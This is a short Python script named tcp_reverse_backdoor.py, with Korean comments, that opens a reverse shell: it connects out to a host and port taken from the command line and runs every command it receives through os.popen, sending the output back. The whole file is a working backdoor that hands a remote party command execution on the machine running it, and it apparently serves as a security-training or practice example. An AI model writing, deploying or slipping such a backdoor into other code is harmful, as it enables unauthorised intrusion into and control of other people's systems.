import os, socket, sys

def usage(): # help
    print('''
    tcp_reverse_backdoor.py <host> <port>
    '''
    )
    exit()

if len(sys.argv) < 3 :
    usage()

with socket.socket() as s:
    addr = (sys.argv[1], int(sys.argv[2]))
    s.connect(addr)
    s.send('''
###########################
# tcp_reverse_backdoor.py #
###########################
>>'''.encode())

    while True:
        data = s.recv(1024).decode().lower()

        if "q" == data:
            # 프로그램 종료
            exit()
        else:
            if data.startswith("cd"): # cd gasbugs
                # 디렉터리 변경
                os.chdir(data[3:].replace('\n',''))
            else :
                result = os.popen(data).read()
            result = result + "\n>>"
            s.send(result.encode())
    










        
